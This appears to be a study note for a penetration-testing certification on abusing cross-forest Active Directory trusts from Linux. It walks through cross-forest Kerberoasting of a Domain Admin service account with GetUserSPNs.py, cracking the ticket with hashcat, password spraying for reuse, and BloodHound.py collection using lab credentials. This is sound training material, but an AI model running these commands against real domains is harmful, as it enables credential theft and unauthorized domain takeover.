# Attacking Domain Trusts — Cross-Forest Trust Abuse — from Linux

> [!info] Core Idea  
> From a Linux attack host, cross-forest trust abuse mainly comes down to two things: **Kerberoasting privileged accounts in the trusted domain** and **enumerating foreign group membership across the trust**. `GetUserSPNs.py` handles the first, while `bloodhound-python` helps map the second.

---

# 💻 COMMAND CHEAT SHEET

> [!card] Impacket — Cross-Forest Kerberoasting  
> `GetUserSPNs.py` can enumerate SPNs in a trusted domain and request TGS tickets for offline cracking.
> 
> > [!code-card] ENUMERATE TARGET-DOMAIN SPNs
> > 
> > ```bash
> > GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
> > ```
> 
> > [!code-card] REQUEST TGS TICKETS
> > 
> > ```bash
> > GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
> > ```
> 
> > [!code-card] SAVE REQUESTED TICKETS TO FILE
> > 
> > ```bash
> > GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -outputfile <OUTPUT FILE>
> > ```
> 
> > [!code-card] CRACK KERBEROS TGS HASH WITH HASHCAT
> > 
> > ```bash
> > hashcat -m 13100 <HASH_FILE> <WORDLIST>
> > ```

> [!card] Linux DNS — `/etc/resolv.conf`  
> Configure DNS resolution when the Linux attack host cannot resolve the target domain controller by hostname.
> 
> > [!code-card] VIEW CURRENT DNS CONFIGURATION
> > 
> > ```bash
> > cat /etc/resolv.conf
> > ```
> 
> > [!code-card] TARGET INLANEFREIGHT DNS
> > 
> > ```text
> > domain INLANEFREIGHT.LOCAL
> > nameserver 172.16.5.5
> > ```
> 
> > [!code-card] TARGET FREIGHTLOGISTICS DNS
> > 
> > ```text
> > domain FREIGHTLOGISTICS.LOCAL
> > nameserver 172.16.5.238
> > ```

> [!card] BloodHound.py — Cross-Domain Enumeration  
> `bloodhound-python` collects Active Directory information from Linux so it can be analyzed in the BloodHound GUI.
> 
> > [!code-card] COLLECT ALL DATA FROM INLANEFREIGHT
> > 
> > ```bash
> > bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
> > ```
> 
> > [!code-card] COLLECT ALL DATA FROM FREIGHTLOGISTICS
> > 
> > ```bash
> > bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
> > ```
> 
> > [!code-card] COMPRESS BLOODHOUND JSON FILES
> > 
> > ```bash
> > zip -r ilfreight_bh.zip *.json
> > ```

---

# 🌲 Cross-Forest Trust Abuse from Linux

The Windows section showed that a forest trust can provide attack paths into another domain.

From Linux, the same concepts apply, but we use Linux-based tooling.

The two major techniques in this section are:

```text
                    CROSS-FOREST TRUST
                           │
              ┌────────────┴────────────┐
              ▼                         ▼
       🔥 Kerberoasting          👥 Foreign Group
              │                    Membership
              ▼                         ▼
       GetUserSPNs.py           bloodhound-python
              │                         │
              ▼                         ▼
        TGS Hash / Crack          BloodHound GUI
              │                         │
              └────────────┬────────────┘
                           ▼
                    Domain B Access
```

> [!important] CPTS Mental Model  
> When you compromise one domain and discover a trust with another domain, **do not restrict enumeration to your current domain**.
> 
> From Linux, think:
> 
> **`GetUserSPNs.py` → privileged SPNs**
> 
> **`bloodhound-python` → foreign membership / trust relationships**

---

# 🔥 1. Cross-Forest Kerberoasting with `GetUserSPNs.py`

Impacket's `GetUserSPNs.py` can perform Kerberoasting across a forest trust.

The important requirement from the source is:

> You need **credentials for a user who can authenticate into the other domain**.

The key option is:

```text
-target-domain
```

This specifies the domain containing the target SPNs.

---

## 🔎 2. Enumerate SPNs in the Trusted Domain

The source runs:

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

The command means:

```text
Current credentials:
INLANEFREIGHT.LOCAL/wley

Target domain:
FREIGHTLOGISTICS.LOCAL
```

The resulting enumeration identifies:

```text
ServicePrincipalName                 Name      MemberOf
-----------------------------------  --------  ------------------------------------------------------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

The critical discovery is:

```text
mssqlsvc
   │
   ├── Has SPN
   │
   └── Domain Admins
```

> [!success] High-Value Finding  
> This is exactly the type of account you want to notice during cross-forest enumeration:
> 
> **SPN + privileged group membership = high-value Kerberoasting target**

---

# 🎫 3. Request the TGS Ticket

Enumeration alone does not provide the Kerberos service-ticket hash.

Add:

```text
-request
```

The source uses:

```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

The output now contains a TGS hash:

```text
$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
```

The workflow is therefore:

```text
GetUserSPNs.py
      │
      ▼
Find SPN
      │
      ▼
Check privileges
      │
      ▼
-request
      │
      ▼
TGS hash
      │
      ▼
Offline cracking
```

---

# 📁 4. Save the TGS Hash to a File

The source notes that we can also use:

```text
-outputfile <OUTPUT FILE>
```

For example:

```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -outputfile <OUTPUT FILE>
```

This makes the workflow convenient because the resulting file can be passed directly to a password-cracking workflow.

---

# 🔓 5. Offline Cracking with Hashcat

The source identifies Hashcat mode:

```text
13100
```

The resulting workflow is:

```text
Cross-Forest SPN
       ↓
GetUserSPNs.py
       ↓
-request
       ↓
$krb5tgs$23$...
       ↓
Hashcat -m 13100
       ↓
Password
       ↓
Authenticate as mssqlsvc
       ↓
Domain Admin
```

> [!important] Why the Account Matters  
> Cracking the hash is only valuable because `mssqlsvc` is a member of:
> 
> ```text
> FREIGHTLOGISTICS.LOCAL\Domain Admins
> ```
> 
> Always connect the **credential** you recover to the **authorization** that account has.

---

# 👑 6. Cross-Forest Kerberoasting Can Give Domain Admin

If the password for `mssqlsvc` is successfully recovered, the source states that we could authenticate into:

```text
FREIGHTLOGISTICS.LOCAL
```

as a **Domain Admin**.

This demonstrates an important trust-abuse principle:

> [!warning] You Don't Always Need to Escalate Locally  
> You may exhaust privilege-escalation options in your current domain while a trusted domain contains a highly privileged Kerberoastable account.
> 
> Therefore:
> 
> **No path in Domain A ≠ no path to Domain B.**

---

# 🔄 7. Check Password Reuse After Cross-Forest Kerberoasting

After recovering the password, the source recommends checking whether the account exists in the current domain and suffers from password reuse.

For example:

```text
FREIGHTLOGISTICS.LOCAL
└── mssqlsvc
    └── Domain Admin

INLANEFREIGHT.LOCAL
└── similarly named account
    └── potentially same password
```

If password reuse exists, one recovered password could provide access in **both directions**.

> [!tip] Reporting Perspective  
> Even if you already control the current domain, discovering password reuse between similarly named privileged accounts in separate domains is still worth documenting as a security finding.

---

# 🧪 8. Single Password Spray as an Iterative Check

The source also suggests that if:

1. Cross-forest Kerberoasting succeeds,
    
2. The password is cracked, and
    
3. You have exhausted options in the current domain,
    

it may be worth attempting a **single password spray** with the recovered password, because the same administrators may manage both domains and may have reused credentials for other service accounts.

The important methodology is:

```text
Recover credential
       ↓
Test known/relevant account
       ↓
Consider limited credential reuse testing
       ↓
Discover another account?
       ↓
Continue enumeration
```

> [!important] Iterative Testing  
> The broader lesson is:
> 
> **Every new credential should create new enumeration opportunities.**
> 
> Don't treat a cracked password as the end of an attack chain.

---

# 🩸 9. Hunting Foreign Group Membership with BloodHound.py

Cross-forest Kerberoasting is only one attack path.

The other major path is:

> **Foreign group membership**

As covered in the Windows section, a user from one domain can be a member of a group in another domain.

The source emphasizes:

```text
Domain Local Groups
```

because these groups can contain security principals from outside their forest.

A particularly dangerous relationship is:

```text
INLANEFREIGHT\administrator
              │
              ▼
FREIGHTLOGISTICS.LOCAL
              │
              ▼
Administrators
```

If the foreign account is compromised, that existing group membership can provide administrative access to the second domain.

---

# 🩸 10. Why BloodHound.py Is Useful from Linux

When working from Linux, we don't need to use the Windows SharpHound collector.

The source uses the Python implementation:

**BloodHound.py**

It can collect AD information from multiple domains and then provide that data to the BloodHound GUI for analysis.

[BloodHound.py GitHub](https://github.com/fox-it/BloodHound.py?utm_source=chatgpt.com)

> [!info] Workflow
> 
> ```text
> Linux Attack Host
>        │
>        ▼
> bloodhound-python
>        │
>        ├── Users
>        ├── Groups
>        ├── Computers
>        ├── Domains
>        └── Trusts
>        │
>        ▼
> JSON Files
>        │
>        ▼
> BloodHound GUI
>        │
>        ▼
> Foreign Group Membership
> ```

---

# 🌐 11. DNS Is Critical

One important practical issue appears when running `bloodhound-python`.

The tool requires a **DNS hostname for the target Domain Controller rather than simply an IP address**.

This creates a problem when your Linux attack host doesn't have internal DNS configured.

For example, you may have:

```text
Target DC:
ACADEMY-EA-DC01

IP:
172.16.5.5
```

but your Linux system cannot resolve:

```text
ACADEMY-EA-DC01
```

---

# 🛠️ 12. Configure `/etc/resolv.conf`

The source checks the current resolver configuration with:

```bash
cat /etc/resolv.conf
```

The original public DNS servers are commented out:

```text
#nameserver 1.1.1.1
#nameserver 8.8.8.8
```

and the internal domain/DNS server is specified:

```text
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

The resulting configuration is:

```text
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

> [!warning] CPTS Note  
> The source warns that `/etc/resolv.conf` may be dynamically generated and changes can be overwritten.
> 
> The important lesson is not merely memorizing the file edit:
> 
> **Your Linux host must be able to resolve the internal AD hostnames required by your enumeration tools.**

---

# 🩸 13. Run BloodHound.py Against INLANEFREIGHT.LOCAL

Once DNS is configured, the source runs:

```bash
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```

Important parameters:

|Option|Purpose|
|---|---|
|`-d`|Target AD domain|
|`-dc`|Domain Controller|
|`-c All`|Collect all supported data categories|
|`-u`|Username|
|`-p`|Password|

The output shows successful enumeration:

```text
INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 559 computers
INFO: Found 2950 users
INFO: Found 183 groups
INFO: Found 2 trusts
```

The particularly interesting line is:

```text
Found 2 trusts
```

This confirms that the collected AD data contains trust relationships that BloodHound can analyze.

---

# 📦 14. Compress the BloodHound Data

BloodHound.py generates multiple JSON files.

The source compresses them into a single ZIP archive:

```bash
zip -r ilfreight_bh.zip *.json
```

Example output:

```text
adding: 20220329140127_computers.json
adding: 20220329140127_domains.json
adding: 20220329140127_groups.json
adding: 20220329140127_users.json
```

The benefit is simple:

```text
Multiple JSON files
       ↓
     ZIP
       ↓
Single upload
       ↓
BloodHound GUI
```

---

# 🌐 15. Change DNS for the Second Forest

The same process is repeated for:

```text
FREIGHTLOGISTICS.LOCAL
```

The source configures:

```text
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

The DNS server is now associated with the second forest.

---

# 🩸 16. Run BloodHound.py Against FREIGHTLOGISTICS.LOCAL

The source uses:

```bash
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```

Notice the username format:

```text
forend@inlanefreight.local
```

This is important because the credentials originate from the **INLANEFREIGHT.LOCAL** domain while enumeration is targeting:

```text
FREIGHTLOGISTICS.LOCAL
```

The output shows:

```text
INFO: Found AD domain: freightlogistics.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 5 computers
INFO: Found 9 users
INFO: Found 52 groups
INFO: Found 1 trusts
```

Again, the trust relationship becomes visible to BloodHound.

---

# 👥 17. Find Foreign Group Membership in BloodHound

After collecting data from both environments and importing it into BloodHound:

1. Open the **Analysis** tab.
    
2. Select:  
    **Users with Foreign Domain Group Membership**
    
3. Select the source domain:  
    `INLANEFREIGHT.LOCAL`
    

BloodHound can then reveal relationships such as:

```text
ADMINISTRATOR@INLANEFREIGHT.LOCAL
                │
                │ Foreign Membership
                ▼
ADMINISTRATORS@FREIGHTLOGISTICS.LOCAL
```

This is the same relationship discovered manually in the previous section.

---

# 🧠 18. Why Collect Both Domains?

This is one of the most important lessons from the section.

Collecting only:

```text
INLANEFREIGHT.LOCAL
```

doesn't give BloodHound the complete picture.

Collecting:

```text
INLANEFREIGHT.LOCAL
        +
FREIGHTLOGISTICS.LOCAL
```

allows BloodHound to correlate identities and relationships across the trust.

Think of it as:

```text
                 BloodHound
                     │
          ┌──────────┴──────────┐
          ▼                     ▼
INLANEFREIGHT.LOCAL      FREIGHTLOGISTICS.LOCAL
          │                     │
          └──────────┬──────────┘
                     ▼
              TRUST RELATIONSHIP
                     │
                     ▼
          FOREIGN MEMBERSHIP
                     │
                     ▼
             ATTACK PATH
```

---

# 🧭 19. Linux Cross-Forest Methodology

> [!card] PHASE 1 — Confirm the Trust  
> Determine whether the domains/forests have a trust relationship and whether the trust direction permits the attack path you're investigating.

> [!card] PHASE 2 — Get Credentials That Can Cross the Trust  
> The source demonstrates using credentials from the current domain to authenticate to the trusted domain.

> [!card] PHASE 3 — Enumerate Target SPNs
> 
> ```bash
> GetUserSPNs.py -target-domain <TARGET-DOMAIN> <CURRENT-DOMAIN>/<USER>
> ```
> 
> Look specifically for privileged accounts.

> [!card] PHASE 4 — Request TGS
> 
> ```bash
> GetUserSPNs.py -request -target-domain <TARGET-DOMAIN> <CURRENT-DOMAIN>/<USER>
> ```

> [!card] PHASE 5 — Crack Offline  
> The source uses Hashcat mode:
> 
> ```text
> 13100
> ```
> 
> If successful, map the recovered password back to the account's privileges.

> [!card] PHASE 6 — Check Credential Reuse  
> If a privileged password is recovered, consider whether it is reused elsewhere within the authorized scope.

> [!card] PHASE 7 — Configure DNS  
> Make sure the Linux host can resolve the target DC by hostname.

> [!card] PHASE 8 — Collect Both Domains  
> Use:
> 
> ```bash
> bloodhound-python
> ```
> 
> against each relevant domain so BloodHound has enough information to correlate the trust relationships.

> [!card] PHASE 9 — Analyze Foreign Membership  
> In BloodHound:
> 
> **Analysis → Users with Foreign Domain Group Membership**
> 
> Then identify whether a compromised identity from Domain A has privileged membership in Domain B.

---

# 🔀 20. Windows vs Linux — Same Attack, Different Tools

|Objective|Windows|Linux|
|---|---|---|
|Enumerate target SPNs|`Get-DomainUser -SPN`|`GetUserSPNs.py`|
|Cross-forest Kerberoasting|`Rubeus.exe kerberoast /domain:`|`GetUserSPNs.py -target-domain`|
|Request TGS|Rubeus|`GetUserSPNs.py -request`|
|Offline cracking|Hashcat|Hashcat|
|Foreign membership|PowerView|`bloodhound-python` + BloodHound|
|SID resolution|`Convert-SidToName`|BloodHound analysis|
|Remote verification|`Enter-PSSession`|Linux-side tooling depends on the available service|

> [!tip] CPTS Pattern  
> The **attack concept doesn't change because your attack host changes**.
> 
> What changes is the tooling:
> 
> ```text
>              Same AD Attack
>                    │
>          ┌─────────┴─────────┐
>          ▼                   ▼
>       Windows               Linux
>          │                   │
>       Rubeus            GetUserSPNs.py
>       PowerView         bloodhound-python
>          │                   │
>          └─────────┬─────────┘
>                    ▼
>             Same Objective
> ```

---

# 🧠 21. CPTS Decision Tree

```text
                 DOMAIN A COMPROMISED
                         │
                         ▼
                  Forest Trust?
                         │
                        YES
                         │
             ┌───────────┴───────────┐
             ▼                       ▼
      Can credentials          Need visibility
      cross the trust?         into both forests?
             │                       │
            YES                      ▼
             │              Configure DNS if needed
             ▼                       │
       GetUserSPNs.py                ▼
             │              bloodhound-python
             ▼                       │
       Target Domain SPNs             ▼
             │                Collect Domain A
             ▼                       +
     Privileged SPN?            Domain B data
             │                       │
            YES                      ▼
             │              Foreign Group Membership
             ▼                       │
       -request TGS                  ▼
             │                Privileged membership?
             ▼                       │
        Hashcat                      ▼
        `13100`                Attack path
             │
             ▼
       Recover password
             │
       ┌─────┴─────┐
       ▼           ▼
   Target AD    Password
    access       reuse?
                   │
                   ▼
              Further access
```

---

# 🧠 22. The Bigger CPTS Mental Model

> [!important] **NEW CREDENTIAL → NEW DOMAIN → NEW ENUMERATION**
> 
> This section reinforces the iterative methodology used throughout AD assessments.
> 
> ```text
> Initial Foothold
>       │
>       ▼
> Compromise Domain A
>       │
>       ▼
> Discover Trust
>       │
>       ▼
> Can credentials cross?
>       │
>       ├───────────────┐
>       ▼               ▼
>  Enumerate SPNs    Enumerate Groups
>       │               │
>       ▼               ▼
> Privileged SPN?   Foreign Membership?
>       │               │
>       ▼               ▼
> Kerberoast       Privileged Group?
>       │               │
>       ▼               ▼
> Crack Password   Existing Access
>       │               │
>       └───────┬───────┘
>               ▼
>        Domain B Access
>               │
>               ▼
>       Enumerate Again
> ```
> 
> **Every time your perspective changes, your enumeration should change with it.**

---

# 🎯 Key Takeaways

> [!success]
> 
> - `GetUserSPNs.py` can perform cross-forest Kerberoasting when you have credentials capable of authenticating into the target domain.
>     
> - `-target-domain` specifies the trusted target domain.
>     
> - `-request` causes `GetUserSPNs.py` to request the TGS needed for offline cracking.
>     
> - `-outputfile` can save the requested ticket/hash data to a file.
>     
> - Hashcat mode `13100` is used in the source for the `$krb5tgs$23$` Kerberos TGS hash.
>     
> - Always inspect the target account's privileges before deciding whether a Kerberoast target is valuable.
>     
> - A Kerberoastable Domain Admin can provide a direct path to full control of the trusted domain.
>     
> - Recovered passwords may also reveal password reuse across similarly managed domains.
>     
> - `bloodhound-python` allows Linux hosts to collect AD data for BloodHound analysis.
>     
> - DNS resolution is important because the source tool requires the Domain Controller's hostname.
>     
> - `/etc/resolv.conf` can be configured to use the internal AD DNS server in the source scenario.
>     
> - Collecting data from **both forests** allows BloodHound to correlate trust and foreign-membership relationships.
>     
> - `Get-DomainForeignGroupMember` on Windows and BloodHound's **Users with Foreign Domain Group Membership** analysis provide complementary ways to identify cross-domain group membership.
>     
> - A foreign administrator account placed in the target domain's `Administrators` group can create a direct administrative attack path.
>     
> - The core Linux workflow is:
>     
> 
> ```text
> TRUST
>   ↓
> CREDENTIALS
>   ↓
> GetUserSPNs.py
>   ↓
> PRIVILEGED SPN
>   ↓
> TGS
>   ↓
> HASHCAT
>   ↓
> NEW CREDENTIAL
>   ↓
> RE-ENUMERATE
> ```
> 
> **Trust relationships should be treated as new attack surfaces, not merely as connectivity between domains.**